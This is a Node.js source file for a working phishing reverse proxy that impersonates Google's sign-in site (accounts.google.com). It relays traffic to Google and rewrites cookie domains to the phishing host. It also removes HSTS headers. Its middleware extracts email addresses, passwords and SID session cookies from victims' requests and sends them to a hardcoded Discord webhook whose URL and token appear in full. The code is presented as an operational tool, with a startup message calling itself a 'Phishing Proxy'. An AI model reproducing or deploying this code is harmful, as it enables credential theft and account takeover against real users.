const express = require('express');
const http = require('http');
const { fetch } = require('undici');
const cookieParser = require('cookie-parser');
const httpProxy = require('http-proxy');
const rawBody = require('raw-body');
const { Readable } = require('stream');

const app = express();

// --- GLOBAL ERROR HANDLERS ---
process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

// --- MIDDLEWARE ---
app.use(cookieParser({ decode: (val) => val }));

// --- CONFIGURATION ---
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1562347397328408668/77sTEQZglTHZUB-iP_oU1nkqftlqKVqpIKxkAirPQ5tNAPd-u-uSDNCapWpAAfgyBp7D';
const TARGET_HOST = 'accounts.google.com';

// --- DISCORD NOTIFIER ---
async function sendToDiscord(title, fields, color = 0x00ff00) {
  if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_WEBHOOK_ID')) {
    console.log('[DISCORD] Webhook not configured. Skipping alert.');
    return;
  }

  const payload = {
    content: `**🚨 ${title}**`,
    embeds: [{
      title: title,
      fields: fields.map(f => ({ name: f.name, value: f.value, inline: f.inline || false })),
      color: color,
      timestamp: new Date().toISOString()
    }]
  };

  try {
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!response.ok) {
      console.error(`[DISCORD] Webhook failed with status: ${response.status}`);
    }
  } catch (err) {
    console.error('[DISCORD] Webhook error:', err.message);
  }
}

// --- COOKIE REWRITER ---
function rewriteCookies(cookies, localDomain) {
  if (!cookies) return [];
  const cookieArray = Array.isArray(cookies) ? cookies : [cookies];
  return cookieArray.map(cookie => {
    if (/domain=/i.test(cookie)) {
      return cookie.replace(/domain=[^;]+/i, `Domain=${localDomain}`);
    } else {
      return `${cookie}; Domain=${localDomain}`;
    }
  });
}

// --- HEALTH CHECK ---
app.get('/health', (req, res) => {
  console.log('[HEALTH] Health check received.');
  res.status(200).send('OK');
});

// --- RAW BODY CATCHER & ANALYZER ---
// This middleware intercepts ALL requests with a body.
app.use((req, res, next) => {
  // If it's a GET/HEAD/DELETE with no body, just pass it through
  if (['GET', 'HEAD', 'DELETE'].includes(req.method)) {
    return next();
  }

  // Use raw-body to buffer the stream into a Buffer
  rawBody(req, {
    length: req.headers['content-length'],
    limit: '10mb', // Google payloads can be large
    encoding: 'buffer' // Use Buffer to preserve exact bytes
  }).then((buffer) => {
    // Store the raw body in a property so we can forward it later
    req.rawBody = buffer;
    
    // Convert to string ONLY for analysis/regex
    const rawBodyStr = buffer.toString('utf8');
    
    console.log(`[RAW] ${req.method} ${req.originalUrl} - Body Length: ${rawBodyStr.length}`);
    if (rawBodyStr.length > 0) {
      console.log(`[RAW] Body Preview: ${rawBodyStr.substring(0, 200)}`);
    }

    // CREDENTIAL EXTRACTION LOGIC
    let email = 'unknown';
    let password = 'unknown';

    // 1. Try to find email patterns
    const emailMatch = rawBodyStr.match(/["']?email["']?\s*[:=]\s*["']?([^"'\s&,]+)/i) || 
                       rawBodyStr.match(/["']?emailOrPhone["']?\s*[:=]\s*["']?([^"'\s&,]+)/i) ||
                       rawBodyStr.match(/["']?identifier["']?\s*[:=]\s*["']?([^"'\s&,]+)/i);
    if (emailMatch) {
      email = emailMatch[1];
    }

    // 2. Try to find password patterns
    const passMatch = rawBodyStr.match(/["']?passwd["']?\s*[:=]\s*["']?([^"'\s&,]+)/i) || 
                      rawBodyStr.match(/["']?password["']?\s*[:=]\s*["']?([^"'\s&,]+)/i);
    if (passMatch) {
      password = passMatch[1];
    }

    // 3. If we found both, it's a credential capture
    if (email !== 'unknown' && password !== 'unknown') {
      console.log(`[CREDENTIALS] RAW CAPTURE: ${email} : ${password}`);
      
      sendToDiscord('Credential Capture (Raw)', [
        { name: 'Email', value: email, inline: true },
        { name: 'Password', value: password, inline: true },
        { name: 'Path', value: req.originalUrl, inline: false },
        { name: 'User-Agent', value: req.headers['user-agent'] || 'Unknown', inline: false }
      ], 0x00ff00);
    } else if (email !== 'unknown') {
      // If we only found email, it might be the first step of a multi-step login
      console.log(`[EMAIL] Captured Email (Step 1): ${email}`);
      sendToDiscord('Email Captured (Step 1)', [
        { name: 'Email', value: email, inline: true },
        { name: 'Path', value: req.originalUrl, inline: false }
      ], 0x00aaff);
    }

    // SESSION HIJACK CHECK
    if (req.headers.cookie) {
      const cookies = req.headers.cookie;
      const sidMatch = cookies.match(/SID=([^;]+)/);
      if (sidMatch) {
        const sid = sidMatch[1];
        console.log(`[SESSION] HIJACK: SID=${sid.substring(0, 10)}...`);
        sendToDiscord('Session Hijack', [
          { name: 'SID', value: sid, inline: false },
          { name: 'IP', value: req.headers['x-forwarded-for'] || req.socket.remoteAddress, inline: false }
        ], 0x00aaff);
      }
    }

    next();
  }).catch((err) => {
    console.error(`[RAW BODY ERROR] ${err.message}`);
    res.status(500).send('Error buffering request body');
  });
});

// --- THE PROXY ENGINE (For GET requests) ---
const proxy = httpProxy.createProxyServer({
  target: TARGET_HOST,
  secure: false,
  changeOrigin: true,
  logLevel: 'silent'
});

proxy.on('error', (err, req, res) => {
  console.error(`Proxy Error: ${err.message}`);
  if (!res.headersSent) {
    res.writeHead(502, { 'Content-Type': 'text/plain' });
    res.end('Bad Gateway');
  }
});

proxy.on('proxyRes', (proxyRes, req, res) => {
  const hostHeader = req.headers['host'] || 'localhost';
  const yourDomain = hostHeader.split(':')[0];
  const setCookieHeaders = proxyRes.headers['set-cookie'];
  
  if (setCookieHeaders) {
    const rewrittenCookies = rewriteCookies(setCookieHeaders, yourDomain);
    proxyRes.headers['set-cookie'] = rewrittenCookies;
  }
  
  delete proxyRes.headers['strict-transport-security'];
});

// --- THE CATCH-ALL ROUTE ---
app.all('/*splat', (req, res) => {
  
  // If we captured a raw body, we need to re-inject it into the req stream
  if (req.rawBody) {
    // We use undici to forward the request manually.
    // This is safer than http-proxy because we can control the body exactly.
    
    const forwardHeaders = {
      ...req.headers,
      'Host': 'accounts.google.com'
    };
    
    // Remove hop-by-hop headers
    delete forwardHeaders['connection'];
    delete forwardHeaders['keep-alive'];
    
    fetch(`${TARGET_HOST}${req.originalUrl}`, {
      method: req.method,
      headers: forwardHeaders,
      body: req.rawBody,
      redirect: 'follow' // Ensure we follow redirects internally
    }).then(async (response) => {
      // Read the response as a buffer to preserve binary data if any
      const data = await response.arrayBuffer();
      
      res.status(response.status);
      
      // Forward headers
      response.headers.forEach((value, key) => {
        const lowerKey = key.toLowerCase();
        // Exclude headers that are handled by Node.js or are hop-by-hop
        if (lowerKey !== 'set-cookie' && lowerKey !== 'content-encoding' && lowerKey !== 'content-length' && lowerKey !== 'transfer-encoding') {
          res.setHeader(key, value);
        }
      });
      
      // Rewrite cookies
      const setCookieHeaders = response.headers.getSetCookie ? response.headers.getSetCookie() : [response.headers.get('set-cookie')].filter(Boolean);
      if (setCookieHeaders && setCookieHeaders.length > 0) {
        res.setHeader('Set-Cookie', rewriteCookies(setCookieHeaders, req.headers['host'].split(':')[0]));
      }
      
      // Send the response body
      res.send(Buffer.from(data));
    }).catch(err => {
      console.error(`Forward Error: ${err.message}`);
      res.status(500).send('Proxy Error');
    });
    
    return;
  }

  // For GET requests or if no raw body, use http-proxy
  proxy.web(req, res, {
    target: TARGET_HOST,
    path: req.originalUrl
  });
});

const server = http.createServer(app);
server.listen(3000, () => console.log('Phishing Proxy running on http://localhost:3000'));
